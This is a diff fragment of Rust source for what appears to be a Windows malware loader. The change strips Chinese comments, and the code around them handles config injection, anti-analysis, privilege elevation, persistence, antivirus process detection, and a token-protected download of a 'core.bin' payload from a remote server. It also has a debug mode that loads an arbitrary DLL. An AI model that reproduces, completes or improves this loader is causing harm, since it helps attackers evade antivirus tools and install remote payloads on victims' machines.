@@ -24,9 +24,6 @@ fn main() {
     let args: Vec<String> = env::args().collect();
     let is_boot = args.iter().any(|a| a == "--boot");
     // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
-    // persistence。仅 debug_assertions 构建可用 —— 发布载荷禁止绕过正常下发
-    // 流程（任何拿到二进制的人都可 --local 加载任意 DLL，等于把 loader 变成
-    // 任意代码执行器；同时 dev 配置写死 127.0.0.1:5000 也毫无用处）。
     #[cfg(debug_assertions)]
     let local_path = args
         .iter()
@@ -42,7 +39,6 @@ fn main() {
     );
 
     // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
-    // persistence。仅 debug_assertions 构建可用（见上方 local_path 解析）。
     if let Some(ref path) = local_path {
         log!("[DEV] --local mode: loading {} directly", path);
         let dll_bytes = match std::fs::read(path) {
@@ -224,7 +220,6 @@ fn main() {
             ))
             .map_err(|e| format!("handshake: {}", e))?;
 
-        // core.bin 下载带一次性凭证（防枚举）；旧服务端无凭证时原样下载
         let dl_url = if download_token.is_empty() {
             download_url
         } else {
@@ -581,7 +576,6 @@ fn check_av_processes() -> bool {
             fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> *mut c_void;
             fn Process32FirstW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
             fn Process32NextW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
-            // 签名与 pe_loader.rs/elevation.rs 对齐（*mut u8），避免 clashing extern 声明
             fn CloseHandle(handle: *mut u8) -> i32;
         }
 
